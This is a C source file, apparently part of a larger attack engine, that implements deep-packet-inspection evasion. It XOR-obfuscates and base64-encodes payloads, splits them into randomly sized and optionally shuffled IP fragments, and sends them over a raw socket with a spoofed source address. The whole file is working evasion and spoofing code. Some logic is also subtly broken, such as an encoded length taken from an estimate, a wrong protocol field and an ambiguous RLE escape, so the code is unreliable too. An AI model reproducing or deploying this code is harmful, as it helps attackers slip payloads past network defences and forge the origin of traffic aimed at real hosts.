#include "../include/dpi_evader.h"
#include "../include/engine.h"
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"

/* ------------------------------------------------------------------ */
/*  Static internal helpers                                            */
/* ------------------------------------------------------------------ */

static uint16_t ip_checksum(uint16_t *buf, int len)
{
    uint32_t sum = 0;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *(uint8_t *)buf;

    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return (uint16_t)(~sum & 0xFFFF);
}

static __thread unsigned int dpi_rand_state = 0;

static inline unsigned int dpi_rand(void) {
    if (dpi_rand_state == 0) dpi_rand_state = (unsigned int)(time(NULL) ^ (uintptr_t)&dpi_rand_state);
    dpi_rand_state = dpi_rand_state * 1103515245U + 12345U;
    return dpi_rand_state;
}

/* ------------------------------------------------------------------ */
/*  Lightweight compression: XOR + simple RLE                          */
/* ------------------------------------------------------------------ */

int dpi_deflate(const uint8_t *input, int in_len,
                uint8_t *output, int *out_len)
{
    if (!input || !output || !out_len || in_len <= 0)
        return -1;

    uint8_t key = (uint8_t)(dpi_rand() & 0xFF);
    int out_pos = 0;

    output[out_pos++] = key;

    int in_pos = 0;
    while (in_pos < in_len && out_pos < *out_len - 4) {
        uint8_t xored = input[in_pos] ^ key;
        int run = 1;

        while (in_pos + run < in_len && run < 255 &&
               (input[in_pos + run] ^ key) == xored) {
            run++;
        }

        if (run >= 3) {
            output[out_pos++] = 0xFF;
            output[out_pos++] = (uint8_t)run;
            output[out_pos++] = xored;
            in_pos += run;
        } else {
            output[out_pos++] = xored;
            in_pos++;
        }
    }

    *out_len = out_pos;
    return 0;
}

/* ------------------------------------------------------------------ */
/*  Base64 encoding                                                   */
/* ------------------------------------------------------------------ */

size_t dpi_encode_base64(const uint8_t *in, size_t in_len, uint8_t *out)
{
    static const uint8_t enc[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";

    size_t out_pos = 0;

    if (!in || !out || in_len == 0)
        return 0;

    for (size_t i = 0; i < in_len; i += 3) {
        uint32_t octet = (uint32_t)in[i] << 16;

        if (i + 1 < in_len)
            octet |= (uint32_t)in[i + 1] << 8;

        if (i + 2 < in_len)
            octet |= (uint32_t)in[i + 2];

        out[out_pos++] = enc[(octet >> 18) & 0x3F];
        out[out_pos++] = enc[(octet >> 12) & 0x3F];

        if (i + 1 < in_len)
            out[out_pos++] = enc[(octet >> 6) & 0x3F];
        else
            out[out_pos++] = '=';

        if (i + 2 < in_len)
            out[out_pos++] = enc[octet & 0x3F];
        else
            out[out_pos++] = '=';
    }

    out[out_pos] = '\0';
    return out_pos;
}

int dpi_encode_gzip(const uint8_t *in, size_t in_len,
                    uint8_t **out, size_t *out_len)
{
    (void)in;
    (void)in_len;
    (void)out;
    (void)out_len;

    fprintf(stderr, "dpi_encode_gzip: not implemented (requires zlib)\n");
    return -1;
}

/* ------------------------------------------------------------------ */
/*  DPI evader init                                                    */
/* ------------------------------------------------------------------ */

EXPORT int dpi_evader_init(const dpi_config_t *cfg)
{
    (void)cfg;
    srand((unsigned int)(time(NULL) ^ (uint32_t)(uintptr_t)cfg));
    return 0;
}

/* ------------------------------------------------------------------ */
/*  Fragment payload                                                   */
/* ------------------------------------------------------------------ */

int dpi_fragment_payload(const uint8_t *payload, size_t payload_len,
                         fragment_t *frags)
{
    if (!payload || !frags || payload_len == 0)
        return -1;

    int count = (int)((payload_len + 1399) / 1400);
    if (count < 1)
        count = 1;
    if (count > 10)
        count = 10;

    int base_size = (int)(payload_len / (size_t)count);
    int remainder = (int)(payload_len % (size_t)count);
    int offset = 0;

    for (int i = 0; i < count; i++) {
        int frag_size = base_size + (i < remainder ? 1 : 0);

        if ((size_t)(offset + frag_size) > payload_len)
            frag_size = (int)(payload_len - (size_t)offset);

        memset(&frags[i], 0, sizeof(fragment_t));
        frags[i].offset = offset;
        frags[i].length = frag_size;

        if (frag_size > 0)
            memcpy(frags[i].data, payload + offset, (size_t)frag_size);

        frags[i].flags = (i < count - 1) ? 0x01 : 0x00;

        offset += frag_size;
    }

    return count;
}

int dpi_fragment_payload_ex(const uint8_t *payload, int payload_len,
                            fragment_t *frags, int max_frags,
                            const dpi_config_t *cfg)
{
    if (!payload || !frags || !cfg || max_frags <= 0 || payload_len <= 0)
        return -1;

    int count = cfg->fragment_count;
    if (count > max_frags)
        count = max_frags;
    if (count < 2)
        count = 2;

    int min_sz = cfg->min_frag_size > 0 ? cfg->min_frag_size : 48;
    int max_sz = cfg->max_frag_size > 0 ? cfg->max_frag_size : 1400;

    if (min_sz > max_sz)
        min_sz = max_sz;

    int remaining = payload_len;
    int offset = 0;

    for (int i = 0; i < count; i++) {
        int is_last = (i == count - 1);
        int frag_size;

        if (is_last) {
            frag_size = remaining;
        } else {
            int avg = remaining / (count - i);
            frag_size = avg + (dpi_rand() % (max_sz - min_sz + 1));
            if (frag_size < min_sz)
                frag_size = min_sz;
            if (frag_size > max_sz)
                frag_size = max_sz;
            if (frag_size > remaining - min_sz)
                frag_size = remaining - min_sz;
        }

        if (frag_size <= 0)
            frag_size = remaining;

        if (frag_size > 1500)
            frag_size = 1500;

        memset(&frags[i], 0, sizeof(fragment_t));
        frags[i].offset = offset;
        frags[i].length = frag_size;

        if (frag_size > 0 && offset < payload_len) {
            int copy_len = frag_size;
            if (offset + copy_len > payload_len)
                copy_len = payload_len - offset;
            memcpy(frags[i].data, payload + offset, (size_t)copy_len);
        }

        frags[i].flags = (uint8_t)(is_last ? 0x00 : 0x01);
        offset += frag_size;
        remaining -= frag_size;

        if (remaining <= 0)
            break;
    }

    return count;
}

/* ------------------------------------------------------------------ */
/*  Fisher-Yates shuffle                                               */
/* ------------------------------------------------------------------ */

void dpi_randomize_frags(fragment_t *frags, int frag_count)
{
    if (!frags || frag_count <= 1)
        return;

    for (int i = frag_count - 1; i > 0; i--) {
        int j = dpi_rand() % (i + 1);
        fragment_t tmp;
        memcpy(&tmp, &frags[i], sizeof(fragment_t));
        memcpy(&frags[i], &frags[j], sizeof(fragment_t));
        memcpy(&frags[j], &tmp, sizeof(fragment_t));
    }
}

/* ------------------------------------------------------------------ */
/*  Send fragmented packets                                           */
/* ------------------------------------------------------------------ */

int dpi_send_fragmented(const fragment_t *frags, int frag_count)
{
    (void)frags;
    (void)frag_count;
    fprintf(stderr, "dpi_send_fragmented: requires active socket handle\n");
    return -1;
}

EXPORT int dpi_send_fragmented_ex(int sock_raw, uint32_t target_ip,
                           uint16_t target_port, uint32_t spoof_ip,
                           const uint8_t *payload, int payload_len,
                           const dpi_config_t *cfg)
{
    int ret;

    if (!payload || !cfg || sock_raw < 0 || payload_len <= 0)
        return -1;

    uint8_t *encoded = NULL;
    int encoded_len = 0;

    if (cfg->encode_base64) {
        size_t est = (size_t)payload_len * 4 / 3 + 4;
        encoded = malloc(est);
        if (!encoded)
            return -1;

        size_t elen = dpi_encode_base64(payload, (size_t)payload_len, encoded);
        encoded_len = (int)elen;
    } else if (cfg->encode_gzip) {
        uint8_t *gz = NULL;
        size_t gz_len = 0;

        if (dpi_encode_gzip(payload, (size_t)payload_len, &gz, &gz_len) == 0 && gz) {
            encoded = gz;
            encoded_len = (int)gz_len;
        }
    }

    if (!encoded) {
        uint8_t *comp = malloc((size_t)payload_len + 64);
        int comp_len = (int)payload_len + 64;

        if (dpi_deflate(payload, payload_len, comp, &comp_len) == 0) {
            encoded = malloc((size_t)comp_len * 4 / 3 + 4);
            if (encoded) {
                dpi_encode_base64(comp, (size_t)comp_len, encoded);
                encoded_len = (int)((size_t)comp_len * 4 / 3 + 4);
            }
            free(comp);
        }

        if (!encoded) {
            encoded = malloc((size_t)payload_len + 1);
            if (!encoded)
                return -1;
            memcpy(encoded, payload, (size_t)payload_len);
            encoded_len = payload_len;
        }
    }

    int max_frags = cfg->fragment_count > 0 ? cfg->fragment_count : 3;
    fragment_t *frags = (fragment_t *)calloc((size_t)max_frags, sizeof(fragment_t));
    if (!frags) {
        free(encoded);
        return -1;
    }

    int frag_count = dpi_fragment_payload_ex(encoded, encoded_len,
                                             frags, max_frags, cfg);
    if (frag_count <= 0) {
        free(encoded);
        free(frags);
        return -1;
    }

    if (cfg->randomize_order)
        dpi_randomize_frags(frags, frag_count);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = target_ip;

    int total_sent = 0;

    struct mmsghdr msgs[64];
    struct iovec iovecs[64];

    int batch = 0;
    for (int i = 0; i < frag_count; i++) {
        uint8_t *pkt = malloc(1600);
        struct iphdr *ip = (struct iphdr *)pkt;
        int ip_len = sizeof(*ip);
        int total_pkt = ip_len + frags[i].length;

        if (total_pkt > 1500) { free(pkt); continue; }

        memset(pkt, 0, 1600);
        ip->version = 4; ip->ihl = 5; ip->tos = 0;
        ip->tot_len = htons((uint16_t)total_pkt);
        ip->id = htons((uint16_t)(dpi_rand() & 0xFFFF));
        ip->frag_off = htons((uint16_t)((frags[i].offset / 8) |
                            (frags[i].flags ? 0x2000 : 0)));
        ip->ttl = 64; ip->protocol = IPPROTO_RAW;
        ip->check = 0; ip->saddr = spoof_ip; ip->daddr = target_ip;
        memcpy(pkt + ip_len, frags[i].data, (size_t)frags[i].length);
        ip->check = ip_checksum((uint16_t *)pkt, ip_len);

        iovecs[batch].iov_base = pkt;
        iovecs[batch].iov_len = total_pkt;
        msgs[batch].msg_hdr.msg_name = &sin;
        msgs[batch].msg_hdr.msg_namelen = sizeof(sin);
        msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
        msgs[batch].msg_hdr.msg_iovlen = 1;
        batch++;

        if (batch >= 64 || i == frag_count - 1) {
            int off = 0, rem = batch;
            while (rem > 0) {
                int ret = (int)sendmmsg(sock_raw, msgs + off, rem, MSG_DONTWAIT);
                if (ret > 0) { off += ret; rem -= ret; total_sent += ret; }
                else if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
                else break;
            }
            for (int j = 0; j < batch; j++) free(iovecs[j].iov_base);
            batch = 0;
        }
    }

    free(encoded);
    free(frags);

    return total_sent;
}

#pragma GCC diagnostic pop
